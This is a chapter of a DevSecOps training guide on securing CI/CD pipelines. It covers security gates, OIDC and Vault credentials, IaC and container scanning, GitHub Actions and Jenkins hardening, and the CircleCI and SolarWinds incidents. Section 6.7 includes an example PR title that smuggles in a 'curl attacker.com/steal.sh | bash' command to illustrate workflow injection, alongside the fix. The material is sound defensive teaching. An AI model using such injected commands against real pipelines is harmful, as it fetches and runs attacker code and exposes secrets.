# Chapter 6: CI/CD & DevSecOps Security

> **Goal:** Understand how to build and operate secure software delivery pipelines. DevSecOps embeds security into every stage of CI/CD so that security gates are automatic, not manual checkpoints that slow teams down.

---

## 6.1 What Is DevSecOps?

**DevSecOps** = Development + Security + Operations

It is the philosophy and practice of integrating security into every phase of software delivery — not as a separate team that reviews code at the end, but as automated checks woven into the pipeline that developers run dozens of times per day.

### The Old Way vs. DevSecOps

**Old way (Waterfall security):**
```
[Code] → [Months of development] → [Pen Test by external team] → [List of findings]
→ [Developers scramble to fix] → [Release delayed 3 weeks]
```

**DevSecOps way:**
```
[Every PR] → [SAST + SCA + Secrets scan in <5 min] → [Developer gets inline feedback]
[Every day] → [DAST on staging] → [Security team reviews new findings]
[Every release] → [Container scan + IaC scan + SBOM generated]
[Always] → [Production monitoring for attack patterns]
```

The shift: security becomes **continuous and automated**, not periodic and manual.

---

## 6.2 CI/CD Pipeline Stages

A modern CI/CD pipeline has multiple stages. Here is how security fits into each:

```
Code Push
    │
    ▼
┌─────────────────────────────────────────────────────────┐
│ Stage 1: Source Checks (runs on every commit)           │
│ - Pre-commit hooks (gitleaks, detect-secrets, linting)  │
│ - Branch protection enforcement                         │
└─────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────┐
│ Stage 2: Build                                          │
│ - Compile application                                   │
│ - Install dependencies                                  │
│ - Generate SBOM                                         │
└─────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────┐
│ Stage 3: Security Scans (parallel — PR gate)            │
│ - SAST (Semgrep/SonarQube)                              │
│ - SCA (Trivy/Grype) — scan dependencies for CVEs        │
│ - Secret scanning (Gitleaks)                            │
│ - IaC scanning (Checkov/tfsec) if infra changed         │
└─────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────┐
│ Stage 4: Build Container Image                          │
│ - Build Docker image                                    │
│ - Container image scanning (Trivy image)                │
│ - Sign image (cosign)                                   │
└─────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────┐
│ Stage 5: Deploy to Staging                              │
│ - Deploy with OIDC credentials (no static secrets)      │
│ - DAST scan against deployed staging app (ZAP)         │
└─────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────┐
│ Stage 6: Security Gate                                  │
│ - Review DAST results                                   │
│ - Confirm all Critical/High findings resolved           │
│ - Security engineer approval (for high-risk changes)    │
└─────────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────────┐
│ Stage 7: Deploy to Production                           │
│ - Deploy via OIDC with least-privilege role             │
│ - Post-deploy smoke tests                               │
└─────────────────────────────────────────────────────────┘
```

---

## 6.3 Security Gates — What Breaks the Build

Not all findings should break the build. Misconfigured gates create alert fatigue and slow down teams.

### The Right Gating Strategy

| Finding Type | Severity | Gate Action |
|---|---|---|
| New critical vulnerability (SAST/SCA) | Critical | Block merge immediately |
| New high vulnerability | High | Block merge; can be overridden with security team approval |
| Known, accepted vulnerability (in .trivyignore / baseline) | Any | Allow — previously reviewed and accepted |
| New medium vulnerability | Medium | Post comment, add to backlog — does not block |
| New low/info | Low | Post comment — informational only |
| Hardcoded secret | Any | Block immediately — no exceptions |

**The key principle:** Gate on **new** findings, not legacy ones. If you apply strict gating to existing codebases without a baseline, teams will drown in alerts from years of security debt — and will disable the tool.

### Baseline-Aware Gating

**The problem:** You integrate Semgrep into a 5-year-old codebase and it finds 400 existing issues. If you gate on all of them, no PR can ever merge.

**The solution:** Establish a baseline

```bash
# Run SAST and save baseline
semgrep --config p/owasp-top-ten --json --output baseline.json .

# On future PRs, only report findings NOT in the baseline
semgrep --config p/owasp-top-ten --baseline-commit=main --json .
```

Then set a 30–90 day window to address the backlog while only gating on new findings.

---

## 6.4 Secrets Management in CI/CD

CI/CD pipelines need credentials to do their work — deploying to AWS, pushing to Docker Hub, calling APIs. Managing these credentials securely is critical.

### The Problem: Secrets in CI Environment Variables

Many teams store secrets as plain-text environment variables in their CI platform:

```yaml
# BAD — visible to any job in the pipeline
env:
  AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
  AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

Problems:
- If the CI platform is breached, all secrets are stolen
- Secrets rotate infrequently because rotation requires updating all pipelines
- Long-lived credentials are high-value targets

### Best Practice 1: OIDC — No Static Secrets

**OIDC (OpenID Connect)** allows CI runners to authenticate to cloud providers without any stored secrets:

```yaml
# GitHub Actions → AWS (no access keys needed)
name: Deploy
permissions:
  id-token: write   # Required for OIDC
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActions-Deploy
          aws-region: us-east-1
          # No AWS_ACCESS_KEY_ID or AWS_SECRET_ACCESS_KEY!
      
      - name: Deploy to S3
        run: aws s3 sync ./build s3://my-app-bucket/
```

**How OIDC works:**
1. GitHub generates a short-lived JWT token signed by GitHub
2. The job sends this token to AWS STS
3. AWS verifies the signature against GitHub's public key
4. AWS returns temporary credentials (valid 1 hour)
5. Job uses temporary credentials to deploy

No static secrets ever exist. Tokens expire in 1 hour. An attacker who intercepts a token gets nothing useful after the job ends.

### Best Practice 2: Dynamic Credentials from Vault

HashiCorp Vault generates database credentials, API keys, and cloud credentials on demand:

```yaml
- name: Get database credentials
  uses: hashicorp/vault-action@v2
  with:
    url: https://vault.company.com
    method: jwt
    role: my-app-ci-role
    secrets: |
      database/creds/my-app-db username | DB_USERNAME ;
      database/creds/my-app-db password | DB_PASSWORD
```

Vault generates a unique username/password for each CI job. The credentials expire after the job ends. No two jobs share the same credentials.

### Best Practice 3: Rotating Static Secrets

For cases where static secrets are unavoidable:
- Rotate every 90 days (quarterly)
- Use a script to update all CI environment variables automatically after rotation
- Monitor for use after rotation (an old secret being used is a breach indicator)

---

## 6.5 IaC Security in Pipelines

Infrastructure-as-Code (IaC) — Terraform, CloudFormation, Kubernetes YAML — is source code for your cloud environment. Misconfigurations in IaC create security vulnerabilities at deployment time.

### Common IaC Security Misconfigurations

**Terraform AWS S3 bucket — public access:**
```hcl
# Vulnerable
resource "aws_s3_bucket" "data" {
  bucket = "my-company-data"
  acl    = "public-read"     # ← Anyone on internet can read this bucket
}

# Fixed
resource "aws_s3_bucket" "data" {
  bucket = "my-company-data"
}

resource "aws_s3_bucket_public_access_block" "data" {
  bucket                  = aws_s3_bucket.data.id
  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}
```

**Kubernetes Pod — running as root:**
```yaml
# Vulnerable
apiVersion: v1
kind: Pod
spec:
  containers:
    - name: app
      image: myapp:latest
      # No securityContext — runs as root by default

# Fixed
spec:
  containers:
    - name: app
      image: myapp:latest
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        readOnlyRootFilesystem: true
        allowPrivilegeEscalation: false
```

### IaC Scanning Tools

**Checkov:**
```yaml
# GitHub Actions — Checkov IaC scanning
- name: Scan Terraform with Checkov
  uses: bridgecrewio/checkov-action@v12
  with:
    directory: infra/terraform/
    framework: terraform
    output_format: sarif
    output_file_path: checkov.sarif
    soft_fail: false   # fail the build on findings
```

**tfsec:**
```bash
tfsec infra/terraform/ --format sarif --out tfsec.sarif
```

Both tools scan IaC files and flag misconfigurations mapped to CIS benchmarks, OWASP, SOC 2, and HIPAA controls.

---

## 6.6 Container Security in Pipelines

Containers are the primary deployment unit in modern enterprises. Container security has two parts:

1. **Image scanning** — finding CVEs in the OS packages and language libraries inside the container image
2. **Image hardening** — building images that minimize attack surface

### Container Image Scanning with Trivy

```yaml
# GitHub Actions — Trivy image scan
- name: Build Docker image
  run: docker build -t myapp:${{ github.sha }} .

- name: Scan Docker image with Trivy
  uses: aquasecurity/trivy-action@master
  with:
    image-ref: 'myapp:${{ github.sha }}'
    format: 'sarif'
    output: 'trivy-results.sarif'
    severity: 'CRITICAL,HIGH'
    exit-code: '1'   # Fail build if CRITICAL or HIGH found
```

### Container Hardening — Dockerfile Best Practices

```dockerfile
# BAD Dockerfile
FROM ubuntu:latest           # large attack surface; unpinned version
RUN apt-get install python3  # may install old version
COPY . /app
CMD ["python3", "app.py"]    # runs as root

# GOOD Dockerfile
FROM python:3.12-slim@sha256:abc123...  # pinned to specific digest
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt  # separate layer for caching
COPY --chown=appuser:appuser . .                     # set ownership
RUN useradd -r -s /bin/false appuser                # create non-root user
USER appuser                                         # switch to non-root
EXPOSE 8000
CMD ["uvicorn", "app.main:app", "--host", "0.0.0.0", "--port", "8000"]
```

Key hardening points:
- **Use minimal base images** (slim, alpine, distroless) — fewer packages = fewer CVEs
- **Pin image digests** (not just tags — `latest` can change) for reproducibility
- **Run as non-root user** — container escape has less impact
- **Read-only filesystem** where possible
- **No secrets in Dockerfile** (ENV instructions with secrets are visible in image history)

### Image Signing with cosign

After building and scanning, sign the image to prove it came from your trusted CI pipeline:

```bash
# Sign the image (in CI)
cosign sign --key cosign.key myapp:v1.2.3

# Verify before deployment (in Kubernetes admission controller)
cosign verify --key cosign.pub myapp:v1.2.3
```

If an attacker compromises a container registry and swaps your image, signature verification catches it.

---

## 6.7 Platform-Specific CI/CD Security

### GitHub Actions Security

**Risks unique to GitHub Actions:**
- Third-party Actions run arbitrary code in your CI environment
- Workflow files are code — a malicious PR can modify them
- GITHUB_TOKEN has broad permissions by default

**Hardening GitHub Actions:**

```yaml
name: CI Pipeline

# Minimal permissions — grant only what is needed
permissions:
  contents: read        # default — read repo content
  pull-requests: write  # needed to post PR comments
  security-events: write # needed to upload SARIF results
  id-token: write       # needed for OIDC to cloud

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      # Pin third-party Actions to full commit SHA, not tag
      # Tags can be changed; SHA is immutable
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
      
      # Audit third-party Actions before using them
      - uses: aquasecurity/trivy-action@6e7b7d1fd3e4fef0c5fa8cce1444b8b3f866d555  # v0.19.0
```

**Prevent workflow injection:**
```yaml
# BAD — PR title injected into shell command
- name: Print PR title
  run: echo "${{ github.event.pull_request.title }}"
  # If title is: "; curl attacker.com/steal.sh | bash #"
  # This executes the curl command!

# GOOD — use environment variable (not directly interpolated)
- name: Print PR title
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "$PR_TITLE"
  # PR_TITLE is treated as data, not code
```

### Jenkins Security

Jenkins is popular in enterprises but requires careful hardening:

**Key Jenkins security settings:**
- Enable "Manage Security" → Matrix-based authorization
- Use RBAC plugin to control who can trigger, configure, and read jobs
- Store credentials in Jenkins Credential Store (not in pipeline scripts)
- Use ephemeral agents (containers/VMs spun up per build, destroyed after) — not long-lived shared agents
- Enable CSRF protection
- Restrict script console access (extremely powerful — can run arbitrary code on Jenkins master)
- Keep Jenkins and all plugins updated

**Jenkinsfile with security best practices:**
```groovy
pipeline {
    agent {
        docker {
            image 'python:3.12-slim'  // Isolated build environment
            args '--read-only'         // Read-only filesystem
        }
    }
    
    environment {
        // Load from Jenkins Credentials Store — not hardcoded
        SONAR_TOKEN = credentials('sonarqube-token')
    }
    
    stages {
        stage('SAST') {
            steps {
                sh 'semgrep --config p/owasp-top-ten --json > semgrep.json'
            }
        }
        stage('Security Gate') {
            steps {
                script {
                    def results = readJSON file: 'semgrep.json'
                    def critical = results.results.findAll { it.severity == 'ERROR' }
                    if (critical.size() > 0) {
                        error("Build failed: ${critical.size()} critical SAST findings")
                    }
                }
            }
        }
    }
}
```

---

## 6.8 Real-World Case Study: CircleCI Breach (2023)

**What happened:** In January 2023, CircleCI (a major CI/CD platform) disclosed a security incident. An attacker compromised a CircleCI employee's machine via malware, stole a session cookie from the employee's browser, and used it to access CircleCI's internal systems. They then exfiltrated customer secrets — environment variables, tokens, and keys stored in CircleCI for CI/CD pipelines.

**Impact:** Thousands of customers had their CI/CD secrets exposed. AWS keys, API tokens, database passwords — everything stored in CircleCI as environment variables was potentially compromised.

**CircleCI's recommendation to customers:**
> "Rotate all secrets stored in CircleCI. Immediately."

**What good security practices would have limited the damage:**

1. **OIDC instead of static secrets:** Customers using OIDC to authenticate to AWS/GCP had nothing to rotate — their "secrets" were short-lived tokens that expired within hours of the build.

2. **Vault with dynamic credentials:** Customers using Vault had credentials that expired per-job. Even if exfiltrated, they were already invalid.

3. **Least privilege:** Customers who had followed least privilege had only the permissions needed for their pipelines. An exposed deploy key for one service could not be used to compromise other services.

4. **Audit log monitoring:** Customers with good CloudTrail and audit logging detected unusual API usage immediately and could contain the breach.

**Lesson:** Never store long-lived secrets in CI/CD platforms. Use OIDC or dynamic credentials. Assume your CI platform will eventually be compromised — your secrets should be worthless when that happens.

---

## 6.9 SolarWinds Supply Chain Attack — The CI/CD Threat Model

**What happened:** Attackers (later attributed to Russian SVR) compromised SolarWinds' build environment in 2019–2020. They injected malicious code (SUNBURST backdoor) into the Orion IT monitoring software during the build process. The build system signed the malicious binary, making it look legitimate. 18,000 organizations installed the backdoored update.

**Why it matters for DevSecOps:**
The attackers did not compromise SolarWinds' application code directly — they compromised the **build system**. The build system is part of your attack surface.

**Controls that would have helped:**

1. **Build environment isolation:** Build servers should be in isolated networks, not reachable from the internet or general corporate network. Privilege escalation from a developer's machine should not reach the build server.

2. **Reproducible builds:** Every build from the same source code should produce a binary-identical artifact. If build servers produce different outputs for the same input, something is wrong.

3. **Build provenance:** Generate a signed attestation for every build:
   - Which source commit was used?
   - Which build tool version?
   - Who triggered the build?
   - What was the build environment?
   If the signed attestation does not match expectations, reject the artifact.

4. **SBOM comparison:** Compare SBOMs between builds. Unexpected new components in the SBOM (like the injected SUNBURST code) would be flagged.

5. **Binary signing + verification:** Even if an attacker signs a malicious binary, a separate integrity verification step could compare the binary's content to the expected SBOM.

**Lesson:** Your CI/CD pipeline is part of your attack surface. Threat-model it. Apply the same security controls to your build infrastructure as to your production infrastructure.

---

## Chapter 6 Summary

| Topic | Key Takeaway |
|---|---|
| DevSecOps philosophy | Security as automated pipeline checks, not manual gates at the end |
| Pipeline stages | Security scans in build stage; DAST in staging; gate before production |
| Security gates | Gate only on new critical/high; baseline legacy findings; never gate on info |
| Secrets management | OIDC > Vault dynamic credentials > short-lived tokens; never static long-lived secrets in CI |
| IaC scanning | Checkov + tfsec on every IaC change; CIS benchmark alignment |
| Container security | Minimal images, non-root, pin digests, scan before push, sign images |
| GitHub Actions | Pin Actions to SHA; minimal permissions; avoid expression injection |
| CircleCI breach | Lesson: OIDC and dynamic credentials make stolen CI secrets worthless |
| SolarWinds | Build environment is an attack surface; provenance, isolation, and SBOM matter |

---

*Next: [Chapter 7 — Cloud & Infrastructure Security](07-Cloud-Infrastructure-Security.md)*
